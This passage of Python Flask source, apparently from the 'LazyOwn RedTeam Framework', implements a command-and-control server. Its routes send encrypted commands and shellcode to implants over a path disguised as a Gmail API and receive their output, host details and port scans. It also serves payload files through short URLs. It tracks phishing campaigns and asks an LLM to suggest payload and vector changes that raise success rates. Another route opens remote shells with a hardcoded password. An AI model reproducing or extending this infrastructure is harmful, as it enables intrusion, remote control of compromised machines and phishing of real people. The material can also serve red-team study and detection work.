    log_pattern = re.compile(
        r'(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}) - INFO - Short URL (.+?) accessed by (.+?) with (.+)'
    )
    try:
        with open('sessions/access.log', 'r') as f:
            for line in f:
                match = log_pattern.match(line.strip())
                if match and match.group(2) == short_url:
                    timestamp, short_url, ip, user_agent = match.groups()
                    download_events.append({
                        'short_url': short_url,
                        'ip': ip,
                        'user_agent': user_agent,
                        'timestamp': timestamp
                    })
    except FileNotFoundError:
        logging.error("access.log not found")
    except Exception as e:
        logging.error(f"Error parsing access.log: {str("")}")
    return download_events

def parse_execution_log(implante):
    """Parse execution log for the given implante, returning execution events."""
    execution_events = []
    log_file = os.path.join(SESSIONS_DIR, f'{implante}.log')
    if not os.path.exists(log_file):
        logging.warning(f"Execution log not found: {log_file}")
        return execution_events
    with open(log_file, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            execution_events.append({
                'client_id': row['client_id'],
                'os': row['os'],
                'pid': row['pid'],
                'hostname': row['hostname'],
                'ips': row['ips'],
                'user': row['user'],
                'command': row['command'],
                'output': row['output'].strip(),
                'timestamp': datetime.now().isoformat()
            })
    return execution_events

def load_implant_config(implante):
    """Load implant configuration from JSON file."""
    config_file = os.path.join(SESSIONS_DIR, f'implant_config_{implante}.json')
    if not os.path.exists(config_file):
        logging.warning(f"Implant config not found: {config_file}")
        return {}
    with open(config_file, 'r') as f:
        return json.load(f)

def load_short_urls():
    """Load short URLs from JSON file, creating it if it doesn't exist."""
    if not os.path.exists(SHORT_URLS_FILE):
        try:
            with open(SHORT_URLS_FILE, 'w') as f:
                json.dump({}, f)
        except Exception as e:
            logging.error(f"Failed to create short_urls.json: {str("")}")
            raise
    try:
        with open(SHORT_URLS_FILE, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        logging.error(f"Failed to parse short_urls.json: {str("")}")
        return {}
    except Exception as e:
        logging.error(f"Error reading short_urls.json: {str("")}")
        raise


def save_short_urls(data):
    """Save short URLs to JSON file."""
    try:
        with open(SHORT_URLS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logging.error(f"Failed to save short_urls.json: {str("")}")
        raise

def is_valid_url(url):
    """Validate if the input is a valid URL or existing local file path."""
    if validators.url(url):
        logging.info(f"Valid web URL: {url}")
        return True
    parsed_url = urlparse(url)
    if parsed_url.scheme == 'file' or not parsed_url.scheme:
        file_path = parsed_url.path if parsed_url.scheme == 'file' else url
        file_path = os.path.abspath(file_path)
        if os.path.exists(file_path) and os.path.isfile(file_path):
            logging.info(f"Valid local file: {file_path}")
            return True
        logging.warning(f"Local file does not exist or is not a file: {file_path}")
    logging.warning(f"Invalid URL or file path: {url}")
    return False

def analyze_behavioral_data(behavioral_events):
    """Analyze behavioral events using Groq AI to generate risk scores."""
    client = Groq(api_key=GROQ_API_KEY)
    analysis_results = []
    for event in behavioral_events:
        prompt = f"""
        Analyze the following user interaction:
        - Event: {event['event_type']}
        - IP: {event['ip']}
        - User Agent: {event['user_agent']}
        - Behavior Data: {event['behavior_data']}
        - Timestamp: {event['timestamp']}
        Determine a risk score (0-100) based on suspicious behavior (e.g., rapid clicks, unusual IPs).
        """
        response = client.chat.completions.create(
            model="llama3-70b-8192",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=100
        )
        risk_score = int(response.choices[0].message.content.strip()) if response.choices[0].message.content.strip().isdigit() else 50
        analysis_results.append({
            'email': event['email'],
            'event_type': event['event_type'],
            'risk_score': risk_score
        })
    return analysis_results

def analyze_campaign_progress(campaign_id, events):
    """Analyze campaign progress and suggest adaptations using Grok AI."""
    client = Groq(api_key=GROQ_API_KEY)
    prompt = f"""
    You are an AI assistant analyzing a ethic phishing campaign simulation. Given the campaign ID {campaign_id} with events: {json.dumps(events)}.
    Suggest adaptations (e.g., change vector, payload, URL) to improve success rate.
    **Important**: Return your response as a valid JSON object with the following structure:
    ```json
    Return JSON: ```json{{ "vector": str, "payload": str, "short_url": str }}```
    """
    response = client.chat.completions.create(
        model="llama3-70b-8192",
        messages=[{"role": "user", "content": prompt}],
        max_tokens=200
    )
    if config.enable_c2_debug == True:
        print(response.choices[0].message.content)
    return json.loads(clean_json(response.choices[0].message.content.strip()))

SAVE_DIR = "sessions/captured_images"
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)


app = Flask(__name__, static_folder='static')

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=[config.c2_daily_limit, config.c2_hour_limit]
)
SESSION_ID = str(uuid.uuid4())
app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja' + SESSION_ID
app.config['SECRET_KEY'] = app.secret_key
app.config['SESSION_COOKIE_SECURE'] = True  
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['REMEMBER_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config["fd"] = None
app.config["child_pid"] = None
app.jinja_env.filters['fromjson'] = fromjson
app.jinja_env.filters['markdown'] = markdown_to_html
BASE_DIR = os.getcwd()
TOOLS_DIR = f'{BASE_DIR}/tools'
BASE_DIR += "/sessions/"
UPLOAD_FOLDER = BASE_DIR + 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_DIRECTORY = BASE_DIR
MODEL = retModel()
shell = LazyOwnShell()
shell.stdout = StringIO() 
shell.onecmd('p')
shell.onecmd('create_session_json')
JSON_FILE_PATH_REPORT = 'static/body_report.json'
implants = {"implants": []}
commands = {}
results = {}
commands_history = {}
remote_commands_history = {}
connected_clients = set()
path = os.getcwd()
atomic_framework_path = f'{path}/external/.exploit/atomic-red-team/atomics'
events = []
counter_events = 0
socketio = SocketIO(app, cors_allowed_origins="*")
login_manager = LoginManager(app)
login_manager.login_view = 'login'
USER_DATA_PATH = 'users.json'
ENV = "PROD"
DATA_FILE = BASE_DIR + 'surface_attack.json'
LOG_DIR = os.path.join('sessions', 'logs', 'c2')
LOG_FILE = os.path.join(LOG_DIR, 'log_c2.txt')
CAMPAIGNS_DIR = os.path.join(os.getcwd(), 'sessions', 'phishing', 'campaigns')
TEMPLATES_DIR = os.path.join(os.getcwd(), 'templates', 'phishing', 'emails')
DB_PATH = os.path.join(os.getcwd(), 'sessions', 'phishing', 'tracking.db')
GMAIL_ADDRESS = config.email_username
GMAIL_APP_PASSWORD = config.email_password
SESSIONS_PHISHING_DIR = os.path.join(os.getcwd(), 'sessions', 'phishing', 'campaigns')
SHORT_URLS_FILE = SESSIONS_PHISHING_DIR + '/short_urls.json'
SESSIONS_DIR = os.path.join(os.getcwd(), 'sessions')
GROQ_API_KEY = config.api_key
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
os.makedirs(TEMPLATES_DIR, exist_ok=True)
conn = sqlite3.connect(DB_PATH)
conn.execute('''CREATE TABLE IF NOT EXISTS tracking
                (campaign_id TEXT, email TEXT, event TEXT, ip TEXT, timestamp TEXT)''')
conn.commit()
conn.execute('''CREATE TABLE IF NOT EXISTS behavioral_tracking (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    campaign_id TEXT,
    short_url TEXT,
    email TEXT,
    event_type TEXT,
    ip TEXT,
    user_agent TEXT,
    timestamp TEXT,
    behavior_data TEXT
)''')
conn.commit()
conn.execute('''CREATE TABLE IF NOT EXISTS multivector_tracking (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    campaign_id TEXT,
    email TEXT,
    event_type TEXT,
    ip TEXT,
    timestamp TEXT
)''')
conn.commit()
conn.close()
with open(f"{path}/sessions/key.aes", 'rb') as f:
    AES_KEY = f.read()

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

api_key = config.api_key
route_maleable = config.c2_maleable_route
win_useragent_maleable = config.user_agent_win
lin_useragent_maleable = config.user_agent_lin
rhost = config.rhost
lhost = config.lhost
reverse_shell_port = config.reverse_shell_port
DIRECTORY_TO_WATCH = f"{BASE_DIR}"
client = Groq(api_key=api_key)
env = Environment(loader=FileSystemLoader('templates'))
env.filters['markdown'] = markdown_to_html
if config.enable_c2_debug == True:
    logger.info(f"[DEBUG] Clave AES (hex): {AES_KEY.hex()}")
implants_check()
create_report()
local_ips = get_local_ip_addresses()

if len(sys.argv) > 3:
    lport = sys.argv[1]
    USERNAME = sys.argv[2]
    PASSWORD = sys.argv[3]
    if config.enable_c2_debug == True:
        logger.info(f"    [!] Launch C2 at: {local_ips}")
        logger.info(f"    [!] Launch C2 at: {lport}")
else:
    if config.enable_c2_debug == True:
        logger.info("    [!] Need pass the port, user & pass as argument")
    sys.exit(2)

if not api_key:
    logging.error("Error: La API key no está configurada en el archivo payload.json")
    exit(1)

if not route_maleable:
    logging.error("Error: c2_maleable_route not found ond payload.json add, Ex:\"c2_maleable_route\": \"/gmail/v1/users/\",")
    sys.exit(1)

if not os.path.exists(atomic_framework_path):
    shell.onecmd('atomic_tests')

class User(UserMixin):
    def __init__(self, user_data):
        self.id = user_data['id']
        self.username = user_data['username']
        self.password_hash = user_data['password_hash']
        self.elo = user_data['elo']

def load_users():
    if os.path.exists(USER_DATA_PATH):
        with open(USER_DATA_PATH, 'r') as file:
            return json.load(file)
    return []

def save_users(users):
    with open(USER_DATA_PATH, 'w') as file:
        json.dump(users, file, indent=4)

def load_data():
    if not os.path.isfile(DATA_FILE):
        return {}
    try:
        with open(DATA_FILE, 'r') as f:
            raw_data = json.load(f)

            if isinstance(raw_data.get("hosts"), list):
                raw_data["hosts"] = [h["ip"] if isinstance(h, dict) else str(h) for h in raw_data["hosts"]]

            return raw_data
    except (json.JSONDecodeError, IOError) as e:
        app.logger.error(f"Error cargando {DATA_FILE}:")
        return {}

@login_manager.user_loader
def load_user(user_id):
    users = load_users()
    for user_data in users:
        if user_data['id'] == int(user_id):
            return User(user_data)
    return None

@app.template_filter('tojson')
def tojson_filter(value, **kwargs):
    """Custom tojson filter to handle non-serializable objects."""
    return json.dumps(make_serializable(value), **kwargs)

@app.route('/', methods=['GET', 'POST'])
@requires_auth
def index():
    response = decoy()
    client_ip = request.remote_addr
    if response:
        return response
    else:
        if current_user.is_authenticated:
            if config.enable_c2_debug == True:
                logger.info(f"Autenticated. Wellcome {client_ip}") 
        else:
            if config.enable_c2_debug == True:
                logger.info("Unautenticated.")
            return redirect(url_for('login'))
    path = os.getcwd()
    user_agent = request.headers.get('User-Agent')
    host = request.headers.get('Host')
    if config.enable_c2_debug == True:
        logger.info(user_agent)
        logger.info(host)
    prompt = getprompt()
    short_urls = load_short_urls()
    prompt = prompt.replace('\n','<br>')
    sessions_dir = f'{path}/sessions'
    json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
    implants_check()
    if not json_files:
        return "No JSON files found in the sessions directory.", 404
    tasks = load_tasks()
    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        status = request.form['status']
        valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]

        if status not in valid_statuses:
            return "Invalid status selected!", 400
        
        new_task = {
            'id': len(tasks),
            'title': title,
            'description': description,
            'operator': operator,
            'status': status
        }
        tasks.append(new_task)
        save_tasks(tasks)
        flash('Task created successfully!', 'success')
        return redirect(url_for('index'))

    latest_json_file = max(json_files, key=lambda x: os.path.getctime(os.path.join(sessions_dir, x)))
    json_path = os.path.join(sessions_dir, latest_json_file)

    with open(json_path, 'r') as f:
        session_data = json.load(f)

    
    if isinstance(session_data, list):
        session_data = session_data[0] if session_data else {}

    session_data['params'] = make_serializable(session_data.get('params', {}))
    session_data['params']['api_key'] = 'Hidden conntent'
    connected_clients_list = list(connected_clients)
    directories = [d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))]

    commands_history = {}
    os_data = {}
    pid = {}
    hostname = {}
    ips = {}
    user = {}
    discovered_ips = {}
    result_portscan = {}
    for client_id in connected_clients_list:
        csv_file = f"sessions/{client_id}.log"
        try:
            if os.path.isfile(csv_file):
                with open(csv_file, 'r') as f:
                    reader = csv.DictReader(f)
                    rows = list(reader)
                    if rows:
                        commands_history[client_id] = [rows[-1]]
                        os_data[client_id] = rows[-1]['os']
                        pid[client_id] = rows[-1]['pid']
                        hostname[client_id] = rows[-1]['hostname']
                        ips[client_id] = rows[-1]['ips']
                        user[client_id] = rows[-1]['user']
                        discovered_ips[client_id] = rows[-1]['discovered_ips']
                        result_portscan[client_id] = rows[-1]['result_portscan']
                     
        except Exception as e:
            if config.enable_c2_debug == True:
                logger.info("[Error] implant logs corrupted.")
    
    event_config = load_event_config()
    response_bot = "<p><h3>LazyOwn RedTeam Framework</h3> The <b>First GPL Ai Powered C&C</b> of the <b>World</b></p>"
    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path = os.path.join(TOOLS_DIR, filename)
            with open(tool_path, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  
                tools.append(tool_data)
    
    karma_name = get_karma_name(current_user.elo)
    connected_hosts = get_discovered_hosts()

    return render_template(
        'index.html',
        connected_clients=connected_clients_list,
        connected_hosts=connected_hosts,
        results=results,
        session_data=session_data,
        commands_history=commands_history,
        os_data=os_data,
        pid=pid,
        hostname=hostname,
        ips=ips,
        user=user,
        username=USERNAME,
        password=PASSWORD,
        c2_route=route_maleable,
        win_useragent=win_useragent_maleable,
        lin_useragent=lin_useragent_maleable,
        implants=implants,
        directories=directories,
        tasks=tasks,
        bot=response_bot,
        event_config=event_config,
        config=config,
        tools=tools,
        current_user=current_user, 
        karma_name=karma_name,
        current_user_id = current_user.id,
        elo=current_user.elo,
        prompt = prompt,
        local_ips= local_ips,
        discovered_ips=discovered_ips,
        result_portscan=result_portscan,
        short_urls=short_urls,
        c2_port=lport
    )

@app.route('/command/<client_id>', methods=['GET'])
@app.route(f'{route_maleable}<client_id>', methods=['GET'])
def send_command(client_id):
    connected_clients.add(client_id)
    if client_id in commands:
        command = commands.pop(client_id)
        encrypted_command = encrypt_data(command.encode())
        return Response(encrypted_command)
    else:
        logging.info(f"No command for client {client_id}")
        encrypted_response = encrypt_data(b'')
        return Response(encrypted_response, mimetype='application/octet-stream')

@app.route('/command/<client_id>', methods=['POST'])
@app.route(f'{route_maleable}<client_id>', methods=['POST'])
def receive_result(client_id):
    try:
        logging.info(f"Receiving result from client {client_id}")
        encrypted_data = request.get_data()
        try:
            decrypted_data = decrypt_data(encrypted_data)
            client_id = decrypted_data.decode().strip()
        except:
            pass      
        decrypted_data = decrypt_data(encrypted_data)
        data = json.loads(decrypted_data)
        if client_id not in connected_clients:
            connected_clients.add(client_id)
            if config.enable_c2_debug == True:
                logger.info(f"New client connected: {client_id}")        
        if not data or not all(key in data for key in ['output', 'command', 'client', 'pid', 'hostname', 'ips', 'user', 'discovered_ips', 'result_portscan']):
            return jsonify({"status": "error", "message": "Invalid data format"}), 400

        output = data['output']
        client = data['client']
        pid = data['pid']
        hostname = data['hostname']
        ips = data['ips']
        user = data['user']
        discovered_ips = data['discovered_ips']
        result_portscan = data['result_portscan']
        command = data['command']


        if not all([command, output, client_id]):
            return jsonify({"status": "error", "message": "Required fields cannot be empty"}), 400

        if not isinstance(client_id, str):
            return jsonify({"status": "error", "message": "Invalid client_id type"}), 400

        sanitized_client_id = ''.join(c for c in client_id if c.isalnum() or c in '-_')
        if not sanitized_client_id or sanitized_client_id != client_id:
            return jsonify({"status": "error", "message": "Invalid client_id format"}), 400

        try:
            allowed_directory_abs = os.path.abspath(ALLOWED_DIRECTORY)
            filename = f"{sanitized_client_id}.log"
            csv_file = os.path.join(allowed_directory_abs, filename)
            csv_file_abs = os.path.abspath(csv_file)
            if not csv_file_abs.startswith(allowed_directory_abs + os.sep):
                return jsonify({"status": "error", "message": "Invalid file path"}), 403

            if not os.access(allowed_directory_abs, os.W_OK):
                return jsonify({"status": "error", "message": "Permission denied"}), 403

        except Exception as e:
            if config.enable_c2_debug == True:
                logger.info(f"[ERROR] Path validation error")
            return jsonify({"status": "error", "message": "Path validation error"}), 500

        try:
            file_exists = os.path.isfile(csv_file_abs)
            with open(csv_file_abs, 'a', newline='') as f:
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(["client_id", "os", "pid", "hostname", "ips", "user","discovered_ips", "result_portscan", "command", "output"])

                safe_data = [
                    str(sanitized_client_id),
                    str(client)[:100],
                    str(pid)[:20],
                    str(hostname)[:100],
                    str(ips)[:100],
                    str(user)[:50],
                    str(discovered_ips)[:1000],
                    str(result_portscan)[:1000],
                    str(command)[:500],
                    str(output)[:1000]
                ]
                writer.writerow(safe_data)

            results[sanitized_client_id] = {
                "output": output,
                "client": client,
                "pid": pid,
                "hostname": hostname,
                "ips": ips,
                "user": user,
                "discovered_ips": discovered_ips,
                "result_portscan": result_portscan,
                "command": command
            }

            logging.info(f"Received output from {sanitized_client_id}: {output[:100]} Platform: {client}")
            connected_clients.add(sanitized_client_id)
            logging.info(f"Client {sanitized_client_id} registered as connected")
            return jsonify({"status": "success", "Platform": client}), 200

        except IOError as e:
            if config.enable_c2_debug == True:
                logger.info(f"[ERROR] File operation error")
            return jsonify({"status": "error", "message": "File operation error"}), 500

    except json.JSONDecodeError:
        if config.enable_c2_debug == True:
            logger.info(f"[ERROR] Invalid JSON received")
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception as e:
        if config.enable_c2_debug == True:
            logger.info(f"[ERROR] Unexpected error")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


@app.route('/issue_command', methods=['POST'])
def issue_command():
    client_id = request.form['client_id']
    command = request.form['command']

    commands[client_id] = command
    if client_id not in commands_history:
        commands_history[client_id] = []
    commands_history[client_id].append(command)

    return redirect(url_for('index'))

@app.route('/upload', methods=['GET', 'POST'])
@app.route(f'{route_maleable}/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        
        if 'file' in request.files:
            file = request.files['file']
            if file.filename == '':
                return jsonify({"status": "error", "message": "Empty filename"}), 400
            filename = secure_filename(file.filename)
            file.save(os.path.join(UPLOAD_FOLDER, filename))
            return jsonify({"status": "success", "message": f"File {filename} uploaded"}), 200

        
        else:
            encrypted_data = request.get_data()
            if not encrypted_data:
                return jsonify({"status": "error", "message": "No data received"}), 400

            
            filename = secure_filename("archivo_recibido.bin")

            decrypted_data = decrypt_data(encrypted_data, True)

            with open(os.path.join(UPLOAD_FOLDER, filename), 'wb') as f:
                f.write(decrypted_data)

            return jsonify({
                "status": "success",
                "message": "File uploaded without header",
                "filename": filename
            }), 200

    
    return '''
    <!doctype html>
    <title>Upload File</title>
    <h1>Upload a File</h1>
    <form method="POST" enctype="multipart/form-data">
      <input type="file" name="file">
      <input type="submit" value="Upload">
    </form>
    '''

@app.route('/download_file', methods=['POST'])
@app.route(f'{route_maleable}download_file', methods=['POST'])
def download_file():
    client_id = request.form['client_id']
    file = request.files['file']
    if file:
        temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
        os.makedirs(temp_dir, exist_ok=True)
        file_path = os.path.join(temp_dir, file.filename)
        file.save(file_path)
        commands[client_id] = f"download:{file.filename}"

        return redirect(url_for('index'))
    else:
        return jsonify({"status": "error", "message": "No file selected"}), 400

import os
from flask import Flask, Response, jsonify

@app.route('/download/<path:file_path>', methods=['GET'])
@app.route(f'{route_maleable}download/<path:file_path>', methods=['GET'])
def serve_file(file_path):
    temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
   ## file_path = secure_filename(file_path) this broken the implant downloads #TODO see what happends 
    
    requested_path = os.path.join(temp_dir, file_path)
    
    
    normalized_temp_dir = os.path.normpath(temp_dir)
    normalized_requested_path = os.path.normpath(requested_path)

    
    if not normalized_requested_path.startswith(normalized_temp_dir + os.sep):
        return jsonify({"status": "error", "message": "Access denied"}), 403

    if os.path.exists(normalized_requested_path):
        try:
            with open(normalized_requested_path, 'rb') as f:
                file_data = f.read()
            encrypted_data = encrypt_data(file_data)
            return Response(
                encrypted_data,
                mimetype='application/octet-stream',
                headers={'Content-Disposition': f'attachment; filename="{file_path}"'}
            )
        except Exception as e:
            return str("audio"), 500
    else:
        return jsonify({"status": "error", "message": "File not found"}), 404

@app.route('/log/<path:data>', methods=['GET', 'POST'])
@app.route(f'{route_maleable}/log/<path:data>', methods=['GET', 'POST'])
def log(data):
    """Log all request details to a JSON file."""
    try:
        request_details = get_request_details()
        request_details['data'] = data
        response = save_to_log(request_details)
        if isinstance(response, tuple):
            return jsonify(response[0]), response[1]
        return jsonify({'status': 'logged', 'id': SESSION_ID}), 200
    except Exception as e:
        return jsonify({'error': str("")}), 500

@app.route('/create_short_url', methods=['POST'])
@requires_auth
def create_short_url():
    """Create multiple short URLs for a single original URL."""
    data = request.get_json()
    if not data:
        logging.warning("No JSON data received in create_short_url")
        return jsonify({'error': 'No data provided'}), 400
    original_url = data.get('original_url')
    custom_short_url = data.get('custom_short_url')
    count = data.get('count', 1)
    if not original_url:
        logging.warning("No original_url provided")
        return jsonify({'error': 'Original URL is required'}), 400
    if not is_valid_url(original_url):
        return jsonify({'error': 'Invalid URL or file path.'}), 400
    short_urls = load_short_urls()
    generated_urls = []
    for _ in range(count):
        short_url = custom_short_url if custom_short_url and not generated_urls else secrets.token_urlsafe(6)
        if short_url in short_urls:
            continue
        short_urls[short_url] = {
            'original_url': original_url,
            'active': True,
            'created_at': datetime.now().isoformat()
        }
        generated_urls.append(short_url)
    save_short_urls(short_urls)
    logging.info(f"Created short URLs: {generated_urls} -> {original_url}")
    return jsonify({'short_urls': generated_urls})

@app.route('/track/<short_url>', methods=['GET'])
def track_interaction(short_url):
    """Serve tracking page and log behavioral data."""
    short_urls = load_short_urls()
    if short_url not in short_urls or not short_urls[short_url]['active']:
        logging.warning(f"Short URL not found or inactive: {short_url}")
        abort(404)
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    behavior_data = request.args.get('behavior', '{}')
    email = request.args.get('email', 'unknown')
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO behavioral_tracking (campaign_id, short_url, email, event_type, ip, user_agent, timestamp, behavior_data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
        ('unknown', short_url, email, 'click', client_ip, user_agent, datetime.now().isoformat(), behavior_data)
    )
    conn.commit()
    conn.close()
    return render_template('tracking_page.html', short_url=short_url, original_url=short_urls[short_url]['original_url'])

@app.route('/update_short_url/<short_url>', methods=['PUT'])
@requires_auth
def update_short_url(short_url):
    try:
        data = request.get_json()
        new_original_url = data.get('original_url')
        active = data.get('active')

        if new_original_url and not is_valid_url(new_original_url):
            return jsonify({'error': 'Invalid URL format'}), 400

        short_urls = load_short_urls()
        if short_url not in short_urls:
            return jsonify({'error': 'Short URL not found'}), 404

        if new_original_url:
            short_urls[short_url]['original_url'] = new_original_url
        if active is not None:
            short_urls[short_url]['active'] = active
        
        save_short_urls(short_urls)
        logging.info(f"Updated short URL: {short_url}")
        return jsonify({'message': 'Updated successfully'})
    except Exception as e:
        logging.error(f"Error in update_short_url: {str("")}")
        return jsonify({'error': f'Internal server error: {str("")}'}), 500

@app.route('/<short_url>')
def redirect_to_file(short_url):
    try:
        short_urls = load_short_urls()
        if short_url not in short_urls or not short_urls[short_url]['active']:
            logging.warning(f"Short URL not found or inactive: {short_url}")
            abort(404)
        original_url = short_urls[short_url]['original_url']
        client_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        logging.info(f"Short URL {short_url} accessed by {client_ip} with {user_agent}")
        parsed_url = urlparse(original_url)
        if parsed_url.scheme == 'file' or not parsed_url.scheme:
            file_path = parsed_url.path if parsed_url.scheme == 'file' else original_url
            file_path = os.path.abspath(file_path)
            if os.path.exists(file_path) and os.path.isfile(file_path):
                return send_file(file_path)
            else:
                logging.warning(f"File not found: {file_path}")
                abort(404)
        return redirect(original_url)
    except Exception as e:
        logging.error(f"Error in redirect_to_file: {str("")}")
        return jsonify({'error': f'Internal server error: {str("")}'}), 500

@app.route('/s/<filename>')
def download_files(filename):
    short_urls = load_short_urls()
    for short_url, data in short_urls.items():
        if not data.get('active', False):
            continue
        parsed_url = urlparse(data['original_url'])
        original_filename = os.path.basename(parsed_url.path)
        if filename == original_filename:
            file_path = os.path.join(SESSIONS_DIR, original_filename)
            if os.path.isfile(file_path):
                return send_from_directory(SESSIONS_DIR, original_filename)
            else:
                abort(404, description="Error 404: File not Found")
    abort(403, description="Acceso denegado o archivo no válido")

@app.route('/view_yaml', methods=['POST'])
@requires_auth
def view_yaml():
    response = decoy()
    if response:
        return response    
    selected_directory = request.form.get('directory')
    if not selected_directory:
        return redirect(url_for('index'))

    yaml_data = []

    selected_path = os.path.join(atomic_framework_path, selected_directory)

    for root, dirs, files in os.walk(selected_path):
        for file in files:
            if file.endswith('.yaml'):
                yaml_file_path = os.path.join(root, file)
                with open(yaml_file_path, 'r') as file:
                    data = yaml.safe_load(file)
                    for test in data.get('atomic_tests', []):
                        yaml_data.append({
                            'auto_generated_guid': test.get('auto_generated_guid'),
                            'name': escape_js_string(test.get('name')),
                            'description': escape_js_string(test.get('description').replace('\n','<br>')),
                            'supported_platforms': test.get('supported_platforms')
                        })

    return render_template('yaml_view.html', yaml_data=yaml_data, directory=selected_directory)



@app.route('/api/run', methods=['POST'])
@requires_auth
def run_command():
    
    data = request.json
    command = data.get('command')

    if not command:
        return jsonify({"error": "No command provided"}), 400

    output = shell.one_cmd(command)
    if config.enable_c2_debug == True:
        logger.info(f"[INFO]{output}")

        logger.info(f"[INFO] Type of output: {type(output)}")

    if isinstance(output, str):
        serializable_output = output
    elif isinstance(output, (int, float, bool, type(None))):
        serializable_output = str(output)
    elif isinstance(output, (list, dict)):
        serializable_output = output
    else:

        try:
            serializable_output = vars(output)
        except TypeError:
            serializable_output = str(output)

    return jsonify({"result": serializable_output}), 200

@app.route('/api/output', methods=['GET'])
def get_output():
    global shell
    output = shell.output
    if config.enable_c2_debug == True:
        logger.info(f"[INFO] Type of output: {type(output)}")

    if isinstance(output, str):
        serializable_output = output
    elif isinstance(output, (int, float, bool, type(None))):
        serializable_output = str(output)
    elif isinstance(output, (list, dict)):
        serializable_output = output
    else:

        try:
            serializable_output = vars(output)
        except TypeError:
            serializable_output = str(output)

    return jsonify({"output": serializable_output})

@app.route('/run_shellcode', methods=['POST'])
@requires_auth
def run_shellcode():
    client_id = request.form['client_id']
    shellcode = request.form['shellcode']
    commands[client_id] = f"sc:{shellcode}"
    return redirect(url_for('index'))

@app.route('/get_results', methods=['GET'])
@requires_auth
def get_results():
    return jsonify(results)

@app.route('/lazyos/<ip>/<port>', methods=['POST'])
def send_lcommand(ip, port):
    try:
        command = request.json.get('command')
        password = "grisiscomebacksayknokknok"
        if not command:
            return jsonify({"error": "No command provided"}), 400

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, int(port)))
            s.sendall(password.encode())
            response = s.recv(1024).decode()
            s.sendall(command.encode())
            response = s.recv(1024).decode()

        return jsonify({"response": response})
    except Exception as e:
        return jsonify({"error": str("audio")}), 500

@app.route('/chatbot', methods=['POST'])
def chatbot():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/vuln', methods=['POST'])
def vuln():
    global events
    data = request.json
    file = f"{path}/sessions/vulns_{rhost}.nmap"
    debug = data.get('debug', True)
    event_view = data.get('event_view', "")
    
    event_config = load_event_config()
    if config.enable_c2_debug == True:
        logger.info(events)    
    
    response = {
        "events": events
    }

    for event in event_config["events"]:
        event_key = event["name"]
        src_path = event["src_path"].format(BASE_DIR=BASE_DIR, rhost=rhost)
        size = event["size"]
        if event_view == event_key:
            current_src_path = src_path
        else:
            current_src_path = ""
    logging.info(event_view)
    logging.info(current_src_path)
    if not file:
        return jsonify({"error": "run lazynmap before"}), 400

    
    response = process_prompt_vuln(client, file, debug, event_view)
    with open(f"{BASE_DIR}/plan.txt", 'w') as f:
       f.write(response)
       f.close()
    shell.onecmd('create_session_json')
    return jsonify({"response": response})

@app.route('/taskbot', methods=['POST'])
def taskbot():
    data = request.json
    file = f"{path}/sessions/tasks.json"
    debug = data.get('debug', True)
    if not file:
        return jsonify({"error": "El file es requerido"}), 400
    response = process_prompt_task(client, file, debug)

    return jsonify({"response": response})

@app.route('/search', methods=['POST'])
def search():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt_search(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/script', methods=['POST'])
def script():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt_script(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/redop', methods=['POST'])
def redop():
    data = request.json
    file = f"{path}/sessions/sessionLazyOwn.json"
    debug = data.get('debug', True)
    if not file:
        return jsonify({"error": "El file es requerido"}), 400
    response = process_prompt_redop(client, file, debug)
    with open(f"{BASE_DIR}/status_redop.txt", 'w') as f:
       f.write(response)
       f.close()
    shell.onecmd('create_session_json')
    return jsonify({"response": response})

@app.route('/adversary', methods=['POST'])
def adversary():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt_adversary(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/generalbot', methods=['POST'])
def generalbot():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
